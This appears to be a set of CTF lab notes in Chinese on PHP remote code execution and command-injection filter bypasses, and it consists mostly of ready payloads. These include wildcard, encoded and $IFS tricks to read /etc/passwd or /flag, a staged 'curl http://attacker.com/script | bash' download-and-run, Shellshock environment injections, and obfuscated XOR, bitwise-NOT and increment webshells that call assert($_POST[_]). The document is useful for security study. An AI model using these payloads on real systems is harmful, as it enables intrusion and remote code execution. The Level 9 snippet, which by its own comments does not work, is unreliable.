# PHPrce-labs-1

## Level 1 - PHP 代码执行函数

PHP 提供了几个可以执行代码的函数。以下是常见的示例及其用法：

* **`eval`**: 直接将字符串作为 PHP 代码执行。
    ```php
    eval("var_dump($GLOBALS['flag']);");
    ```

* **`assert`**: 将字符串作为 PHP 表达式来执行断言。如果断言是一个字符串，它会被当作 PHP 代码来评估（行为因 PHP 版本而异，在较新版本中，若无特定设置，不常用于直接代码执行）。
    ```php
    assert("var_dump(\$GLOBALS['flag'])");
    ```

* **`call_user_func`**: 调用第一个参数指定的回调函数，并将剩余的参数传递给它。
    ```php
    call_user_func("var_dump", $GLOBALS['flag']);
    ```

* **`create_function`**: 创建一个匿名（lambda 风格）函数。第一个参数定义参数，第二个参数定义函数体代码。返回一个唯一的函数名。*（在 PHP 7.2.0 中已弃用，在 PHP 8.0.0 中已移除）*
    ```php
    create_function('', 'var_dump($GLOBALS["flag"]);');
    ```

* **`array_map`**: 将回调函数作用于数组的每个元素。返回一个包含结果的数组。
    ```php
    array_map("var_dump", [$GLOBALS['flag']]);
    ```

* **`call_user_func_array`**: 与 `call_user_func` 类似，但将回调函数的参数作为一个数组（第二个参数）来接收。
    ```php
    call_user_func_array("var_dump", [$GLOBALS['flag']]);
    ```

* **`usort`**: 使用用户定义的比较函数对数组进行排序。回调函数接收两个参数进行比较。代码执行发生在比较逻辑*内部*。
    ```php
    usort([&$GLOBALS['flag']], function($a, $b) { var_dump($GLOBALS['flag']); return 0; });
    ```

* **`array_filter`**: 使用回调函数过滤数组的元素。代码执行发生在回调函数*内部*。
    ```php
    array_filter([$GLOBALS['flag']], function($x) { var_dump($GLOBALS['flag']); return true; });
    ```

* **`array_reduce`**: 使用回调函数将数组迭代地规约为单个值。回调函数接收累积值 (`carry`) 和当前项。代码执行发生在回调函数*内部*。
    ```php
    array_reduce([$GLOBALS['flag']], function($carry, $item) { var_dump($GLOBALS['flag']); return $carry; }, null);
    ```

* **`preg_replace`**: 执行正则表达式搜索和替换。配合 `/e` 修饰符（在较新的 PHP 版本中已弃用/移除），替换字符串会被当作 PHP 代码来评估。*（危险且已弃用，在 PHP 7.0.0 中移除）*
    ```php
    // 仅在 PHP < 7.0 且启用了 /e 修饰符时有效
    preg_replace("/.*/e", "var_dump(\$GLOBALS['flag'])", "x");
    ```

---

## Level 2 - 命令执行绕过（操作符 & 通配符）

Shell 操作符和通配符可用于构造命令并绕过简单的过滤器。

**操作符:**

* `&&`: 仅当第一个命令成功时执行第二个命令。
* `||`: 仅当第一个命令失败时执行第二个命令。
* `&`: 在后台运行第一个命令，立即执行第二个命令（并行执行）。
* `;`: 在第一个命令完成后执行第二个命令（无论成功/失败）。
* `>`, `<`, `>>`, `<<`: 重定向操作符（输入/输出）。
* `` ` `` (反引号): 命令替换；执行内部的命令，并用输出替换反引号。
* `$()`: 命令替换（比反引号更推荐）。
* `|` (管道符): 将第一个命令的标准输出发送到第二个命令的标准输入。

**通配符 & 特殊字符:**

* `''`/`""`: 定义空字符串或保护含有空格/特殊字符的字符串。
* `*`: 匹配零个或多个字符。
* `?`: 匹配恰好一个字符。
* `[]`: 匹配方括号内的任意单个字符。
* `[^]`: 匹配*不在*方括号内的任意单个字符。
* `{}`: 花括号扩展（例如，`{cat,ls}` 扩展为 `cat ls`）。在某些上下文中可用于命令执行，如 ` {cat,/etc/passwd} `。
* `!`: 历史扩展或取反（取决于上下文）。
* `\`: 转义字符；移除下一个字符的特殊含义。

**绕过示例:**

```bash
# 使用 '' 和 ? 绕过对 'cat' 和 'passwd' 的引用/过滤
system("c''at /e't'c/pass?d");

# 使用 ? 通配符绕过对 '/bin/cat' 的过滤
system("/???/?at /e't'c/pass?d");

# 使用 * 通配符绕过过滤
system("/???/?at /e't'c/*ss*");
```

---

## Level 3 - 无字符 & 通配符绕过

在不使用某些字符或严重依赖通配符的情况下执行命令的方法。

* **八进制绕过 (Bash):** 使用 `$'xxx'` 形式，其中 `xxx` 是字符的八进制表示。
    ```bash
    # 示例: cat /flag -> $'\\143\\141\\164\\040\\057\\146\\154\\141\\147'
    bash -c $'\\143\\141\\164\\040\\057\\146\\154\\141\\147'
    ```

* **十六进制绕过:** 将命令字符串编码为十六进制，并将其通过管道传递给 `xxd -r -p`（反向十六进制转储），然后再传递给 `bash`。
    ```bash
    # cat /flag = 636174202f666c6167
    echo -n 636174202f666c6167 | xxd -r -p | bash
    ```

* **二进制绕过 (Bash):** 使用 `$((2#binary))` 进行二进制表示。
    ```bash
    # 示例 (对于完整命令不太常见，对数字/字符有用)
    ```
    * **Shell 算术:** 使用 Shell 算术构造数字。
        * `$(())` -> `0`
        * `$((~$(())))` -> `-1` (0 的按位取反)
        * `$(($((~$(())))$((~$(())))))` -> `-1-1` -> `-2` (这里的连接意味着操作，取决于上下文)
    * **`${##}`:** 如果没有设置位置参数，可以代表 `0`。

* **通配符绕过 (命令执行):** 使用通配符匹配 `/bin` 或 `/usr/bin` 等目录中的命令名称。
    ```bash
    # 在 /bin/ 中使用通配符匹配 'cat'
    /???/c?t /etc/passwd
    /b??/c?t /etc/passwd
    ```

---

## Level 4 - 空格过滤 & 赋值拼接绕过

规避阻止空格字符的过滤器的技术。

* **Tab 字符:** 使用水平制表符的 URL 编码形式 (`%09`)。
    `?cmd=ls%09-la`

* **`$IFS` 变量:** Shell 中的内部字段分隔符变量默认为空格、制表符和换行符。你可以用它代替字面上的空格。
    `cat$IFS/etc/passwd`
    `cat${IFS}$9/etc/passwd` (`$9` 通常为空，实际上只使用了 `$IFS`)

* **重定向:** 如果你可以控制文件的内容或名称，可以使用输入重定向。
    `?cmd=cat</fl""ag` (从名为 `flag` 的文件中读取，空引号 `""` 防止路径名扩展问题)

* **花括号扩展:** 在花括号内使用逗号（不需要空格）。
    `{cat,/etc/passwd}` (在某些上下文中可能会执行 `cat /etc/passwd`)

* **空格的十六进制编码:** 在某些上下文中的字符串内使用 `\x20`。
    `X=$'cat\x20/flag'&&$X` (将命令赋值给 X，然后执行 X)

* **赋值 & 拼接:** 将命令和文件名分成几部分，将它们赋值给变量，然后连接它们。
    * 命令: `a=c;b=at;c=/fl;d=ag;$a$b$c$d`
    * URL 编码的 Payload: `?cmd=a%3Dc%3Bb%3Dat%3Bc%3D%2Ffl%3Bd%3Dag%3B%24a%24b%24c%24d`

---

## Level 5 - 编码 & 特殊 Shell 变量

利用 Shell 变量和编码方案。

**特殊的 Bash 变量:**

* `${#}`: 位置参数的数量（如果没有则为 0）。
* `${?}`: 上一个命令的退出状态（0 表示成功，非零表示失败）。
* `${_}`: 上一个命令的最后一个参数。
* `${0}`: 当前 Shell 或脚本的名称。
* `${1}` 到 `${9}`: 第 1 到第 9 个位置参数。
* `${@}`: 所有位置参数，作为单独的词。
* `${*}`: 所有位置参数，作为一个单独的词。
* `${$}`: 当前 Shell 的进程 ID (PID)。
* `${!}`: 最近一个后台命令的 PID。
* `${-}`: 为 Shell 设置的当前选项（例如 `hB`）。

**Base64 编码示例:**

```bash
# 使用 base64 解码执行 'cat /flag' (Y2F0IC9mbGFn)

# 方法 1: 使用 echo 进行命令替换
cat "$(echo 'L2ZsYWc=' | base64 -d)" # 解码 '/flag'

# 方法 2: 使用 echo 和反引号 (不太推荐)
`echo "Y2F0IC9mbGFn" | base64 -d` # 执行解码后的命令

# 方法 3: 将解码后的命令通过管道传给 bash
echo "Y2F0IC9mbGFn" | base64 -d | bash
```

---

## Level 6 - 长度限制绕过

绕过对每个命令输入长度的限制，通常通过使用重定向和 `ls -t` 逐步构建脚本。

**概念:**

1.  使用带有重定向 (`>`) 的短命令，将所需命令/脚本的部分内容逐行写入文件。
2.  `ls -t` 按修改时间对文件排序（最新的在前）。
3.  重定向 `ls -t` 的输出 (`ls -t > file`) 可以将按相反顺序写入的行组装成最终的脚本文件。
4.  执行组装好的脚本文件（例如 `sh file`）。

**示例步骤 (简化):**

假设每个命令有 5 个字符的限制。目标：运行 `ls -l > output`。

1.  `>l\ ` (写入 "l ")
2.  `>-\ ` (写入 "-")
3.  `>\>o*` (写入 ">o*" - 假设 'output' 匹配 'o*')
4.  `>ls\ ` (写入 "ls ")
5.  `ls -t>a` (根据修改时间将行合并到文件 'a' 中 - 顺序可能需要技巧)
6.  `sh a` (执行存储在 'a' 中的组装好的命令 `ls -l >output`)

**示例：反向 Shell 脚本组装 (概念性):**

目标：执行 `curl http://attacker.com/script | bash`

1.  将命令分解成小的、反向排序的部分：`bash`, `|`, `script`, `/`, `com`, `.`, `attacker`, `//`, `http`, `curl`。
2.  使用重定向 (`>partN`) 将每个部分写入文件。
    ```bash
    >bash # (5 字符)
    >\|\  # (3 字符) - 可能需要转义或引号
    >ipt  # (4 字符)
    >scr  # (4 字符)
    # ... 等等，按相反顺序 ...
    >curl # (5 字符)
    ```
3.  使用 `ls -t > final_script` 将各部分按正确顺序组装到 `final_script` 中。
4.  执行 `sh final_script`。

*(注意：用户原始笔记详细说明了一个更复杂的 `socat` 监听器和多部分 IP 地址分解，遵循相同的反序写入和使用 `ls -t` 组装的原则)*

---

## Level 7 - PHP 命令执行函数 & 环境变量注入

更多的 PHP 函数和基于环境的攻击。

**PHP 执行函数:**

* **`system()`**: 执行外部程序并显示输出。
* **`exec()`**: 执行外部程序。不直接输出；返回输出的最后一行，并能用所有输出行填充一个数组。
* **`shell_exec()` / `` ` `` (反引号)**: 通过 Shell 执行命令并返回完整的输出作为字符串。
* **`passthru()`**: 执行外部程序并显示原始输出。用于期望二进制输出的情况。

**环境变量注入 (Shellshock 及相关):**

如果目标系统的 Bash 存在漏洞（例如 Shellshock 或 `BASH_FUNC_*` 问题），当调用脚本或程序（如 PHP 调用 Shell）时，特制的环境变量可能导致命令执行。

* **Shellshock (Bash < 4.3 补丁):**
    ```bash
    TEST='() { :; }; echo vulnerable; id' bash -c "echo test"
    ```
* **`BASH_FUNC_` 前缀滥用 (Bash < 4.4):**
    ```bash
    env $'BASH_FUNC_echo()=() { id; }' bash -c "echo hello"
    ```
* **`BASH_FUNC_` 后缀滥用 (Bash >= 4.4):**
    ```bash
    env $'BASH_FUNC_echo%%=() { id; }' bash -c 'echo hello'
    ```

---

## Level 8 - PHP Filter Chain Exploit (PHP 过滤器链利用)

* **概念:** 在文件包含函数（`include`, `require` 等）中使用 `php://filter` 流包装器来在包含文件*之前*操纵文件内容。
* **利用:** 链式使用过滤器（例如 `convert.base64-decode`）可能注入并执行 PHP 代码。一种常见技术涉及双重编码 PHP 代码（如 `<?php system($_GET['cmd']); ?>`），并在服务器端包含期间使用过滤器对其进行解码。
* **工具:** `PHP-FilterChain-Exploit` 脚本可以自动化生成这些过滤器链。

---

## Level 9 - 自增/自减绕过 (PHP)

* **概念:** 仅使用非字母数字字符构造可执行字符串（如函数名和参数），通常依赖于数组索引和增量/减量运算符，在像 `eval()` 这样的执行上下文中进行。
* **机制:**
    1.  通过访问数据类型的字符串表示（例如 `([].'')` 得到字符串 "Array"）来获取初始字符（例如 'A', 'r'）。使用 `true` (1) 或 `false` (0) 进行索引可以得到 'r' 或 'A'。
    2.  对字符使用增量运算符 (`++`) 来得到其他所需字符（'A'++ -> 'B', 'S'++ -> 'T'）。
    3.  连接 (`.`) 这些字符以形成函数名 (`'assert'`, `'system'`) 和命令字符串 (`'cat /flag'`)。
    4.  使用构造的函数名和参数执行。

* **示例 (为 `eval` 构造 `system('cat /flag')`):**
    ```php
    <?php
    // 假设目标是通过 eval 或类似方式生成 system('cat /flag')
    // 注意：初始赋值 `$_— = ([].'')[''==''];` 实际上得到 'r'，因为 ''=='' 是 true (索引 1)。
    // 下面的逻辑似乎假设它从 'A' (索引 0/false) 开始。
    // 这个特定示例若不先修改以获取 'A'，可能无法按预期工作。
    // 请参阅 Level 11 中一个正确启动的自增示例。

    $_— = ([].'')[''=='']; // $_— 是 'r' ("Array" 的索引 1)
    $_—++; // 's'
    $_—++; // 't'
    $_—++; // 'u'
    $_—++; // 'v'
    $_—++; // 'w'
    $_—++; // 'x'
    $_—++; // 'y'
    $_—++; // 'z' - 这个序列似乎不能直接从 'r' 得到 'system'

    // --- 代码的其余部分假设它以某种方式得到了 'system' 和 '/flag' ---
    // *预期的逻辑*可能类似于 Level 11 的自增示例。
    // 这个特定的代码块需要修正才能达到所述目标。

    // 假设经过复杂的构造后，$_ 持有 'system'，$__ 持有 'cat /flag'：
    // $_($__);
    ?>
    ```

---

## Level 10 - 无参数命令执行绕过 (PHP)

* **场景:** 你可以调用 PHP 函数，但不能在括号内直接提供参数（例如，只允许 `function()`，不允许 `function('arg')`）。可能允许像 `A(B(C()))` 这样的嵌套调用。
* **目标:** 尽管存在无参数限制，仍要执行命令或读取文件。
* **技术:**
    1.  **获取外部数据:** 使用从请求或环境中检索数据的函数，有效地从外部引入“参数”。
        * `getallheaders()`: 以数组形式返回所有 HTTP 头。（可以通过头注入数据）。
        * `session_id()`: 返回会话 ID。（如果会话 ID 可控，可以注入数据）。
        * `get_defined_vars()`: 返回所有已定义变量的数组。
    2.  **获取内部数据:** 使用返回有关服务器环境的有用信息的函数，尤其是文件/目录名。
        * `getcwd()`: 获取当前工作目录路径。
        * `scandir()`: 列出路径中的文件/目录（通常与 `localeconv()` 或 `getcwd()` 返回的 `.` 结合使用）。
        * `localeconv()`: 返回区域设置的数字/货币格式信息；第一个元素（`.` 小数点）通常很有用。
        * `dirname()`: 返回路径中的目录部分。
        * `chdir()`: 更改当前目录。
    3.  **数组操作:** 处理上述函数返回的数组，以分离出所需的值（如文件名）。
        * `array_reverse()`: 反转数组顺序。
        * `current()` / `pos()`: 获取当前（第一个）元素。
        * `next()` / `prev()` / `end()` / `reset()`: 导航数组指针。
        * `array_flip()`: 交换键和值。
        * `array_rand()`: 从数组中获取一个随机键。
        * `array_slice()`: 提取数组的一个切片。
    4.  **文件读取/显示:** 使用接收文件名（通过步骤 2 & 3 获取）并显示其内容的函数。
        * `show_source()` / `highlight_file()`: 显示带有语法高亮的源代码。
        * `readfile()`: 输出文件内容。
        * `file_get_contents()`: 将整个文件读入字符串（需要 `print` 或 `echo` 来显示）。
        * `readgzfile()`: 有时也可以读取非 gzip 格式的文件。

* **示例 (显示当前目录下随机文件的源代码):**
    ```php
    // 1. localeconv() -> [decimal_point => '.', ...]
    // 2. current() -> '.' (当前目录)
    // 3. scandir('.') -> ['.', '..', 'index.php', 'flag.php', ...]
    // 4. array_flip() -> [ '.'=>0, '..'=>1, 'index.php'=>2, 'flag.php'=>3, ...]
    // 5. array_rand() -> 'flag.php' (返回一个随机 *键*)
    // 6. show_source('flag.php') -> 显示文件内容
    show_source(array_rand(array_flip(scandir(current(localeconv())))));
    ```

---

## Level 11 - 按位取反 (~) 绕过 (PHP)

* **概念:** 使用按位取反运算符 (`~`) 来从字符构造字符串，而不直接使用字母数字字符。这通常涉及对已知字符串（如 `_GET`, `Array` 或特定的 UTF-8 字符）应用 `~` 并连接结果。
* **机制:** 按位取反会翻转字符的 ASCII/UTF-8 表示的所有位。通过对精心选择的字符或字符串进行取反，可以获得构建函数名和命令所需的其他字符。这很复杂，通常需要反复试验或辅助脚本。
* **工具:** 使用 `https://probiusofficial.github.io/PHP-inversion/` 的脚本。
* **示例代码片段结构:** (概念性的，实际字符取决于目标字符串)
    ```php
    <?php
    // 示例结构，使用对 UTF-8 字符的按位取反
    // 目标: 构造 'assert' 和 '_POST'
    $____ = (~'瞰') . (~'和') . (~'和') . (~'的') . (~'半') . (~'始'); // 构造 'assert'
    $_____='_';
    $_____.= (~'俯') . (~'瞰') . (~'次') . (~'站'); // 构造 'POST', 追加到 '_'
    $_=$$_____; // $_ = $_POST ('$$_____' 解析变量名 '_POST')
    $____($_[_]); // assert($_POST[_])
    ?>
    ```

---

## Level 12 - 非字母数字代码执行 (PHP)

完全避免使用字母，仅使用符号和可能的数字来编写 PHP 代码的技术。对于绕过极端的 WAF 很有用。

1.  **XOR 绕过:**
    * 在字符串或字符（通常是通过 URL 编码表示的单字节字符串，如 `%01`）之间使用 XOR 运算符 (`^`) 来生成所需的字符。
    ```php
    <?php
    // 目标: assert($_POST[_]);
    $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_ = "assert"
    $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__ = "_POST"
    $___=$$__; // $___ = $_POST (可变变量)
    $_($___[_]); // assert($_POST[_]);
    ?>
    ```

2.  **按位取反绕过 (使用 UTF-8):**
    * 与 Level 10 类似，对多字节 UTF-8 字符使用 `~` 来生成函数名和变量所需的 ASCII 字符。需要已知的映射或反复试验。
    ```php
    <?php
    // 目标: assert($_POST[_]); 仅使用运算符、数字、下划线和 UTF-8 字符串。
    $__=('>'>'<')+('>'>'<'); // $__ = 1+1 = 2
    $_=$__/$__; // $_ = 2/2 = 1
    $____=''; // $____ = ""
    $___="瞰";$____.=~($___{$_}); // $____ .= ~("瞰"[1]) -> 'a'
    $___="和";$____.=~($___{$__}); // $____ .= ~("和"[2]) -> 's' // 索引可能因编码/PHP版本而异
    $___="和";$____.=~($___{$__}); // $____ .= ~("和"[2]) -> 's'
    $___="的";$____.=~($___{$_}); // $____ .= ~("的"[1]) -> 'e'
    $___="半";$____.=~($___{$_}); // $____ .= ~("半"[1]) -> 'r'
    $___="始";$____.=~($___{$__}); // $____ .= ~("始"[2]) -> 't'
    // $____ 现在是 "assert"
    $_____='_'; // $____ = "_"
    $___="俯";$_____.=~($___{$__}); // $_____.= ~("俯"[2]) -> 'P'
    $___="瞰";$_____.=~($___{$__}); // $_____.= ~("瞰"[2]) -> 'O'
    $___="次";$_____.=~($___{$_}); // $_____.= ~("次"[1]) -> 'S'
    $___="站";$_____.=~($___{$_}); // $_____.= ~("站"[1]) -> 'T'
    // $_____ 现在是 "_POST"
    $_=$$_____; // $_ = $_POST (可变变量)
    $____($_[$__]); // assert($_POST[2])
    ?>
    ```

3.  **自增/自减绕过 (修正示例):**
    * 使用数组到字符串的转换 (`[].''` -> `"Array"`) 和布尔/整数索引 (`[0]` -> `'A'`, `[1]` -> `'r'`) 结合 `++` 来逐个字符地构建字符串。
    ```php
    <?php
    // 目标: ASSERT($_POST[_]);
    $_=[].'';           // $_ = "Array" (字符串)
    $__ = !$_;          // $__ = False (布尔值) - 索引 0
    $___ = $_[$__];      // $___ = $_[0] = "A"
    $__ = $___;          // $__ = "A"
    $_ = $___;           // $_ = "A"

    // 创建 'S'
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__ = "S"
    $___ .= $__;         // $___ = "AS"
    $___ .= $__;         // $___ = "ASS"

    // 创建 'E'
    $__ = $_;            // $__ = "A"
    $__++;$__++;$__++;$__++; // $__ = "E"
    $___ .= $__;         // $___ = "ASSE"

    // 创建 'R'
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__ = "R" (注意: 原文在 ++ 前有分号?)
    $___ .= $__;         // $___ = "ASSER"

    // 创建 'T'
    $__++;$__++;         // $__ = "T"
    $___ .= $__;         // $___ = "ASSERT"

    // $___ 现在持有 "ASSERT"

    // 创建 '_POST'
    $__ = $_;            // $__ = "A"
    $____ = "_";         // $____ = "_"
    // 创建 'P'
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__ = "P"
    $____ .= $__;        // $____ = "_P"
    // 创建 'O'
    $__ = $_;            // $__ = "A"
    $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__ = "O"
    $____ .= $__;        // $____ = "_PO"
    // 创建 'S'
    $__++;$__++;$__++;$__++; // $__ = "S"
    $____ .= $__;        // $____ = "_POS"
    // 创建 'T'
    $__++;               // $__ = "T"
    $____ .= $__;        // $____ = "_POST"

    // $____ 现在持有 "_POST"

    // 执行
    $_ = $$____;         // $_ = $_POST (可变变量, 使用字符串 "_POST")
    $___($_[_]);         // ASSERT($_POST[_]) - 调用 ASSERT 函数，以 $_POST[_] 作为参数
                         // 使用未定义的默认常量 "_" 作为数组键。
    ?>
    ```

---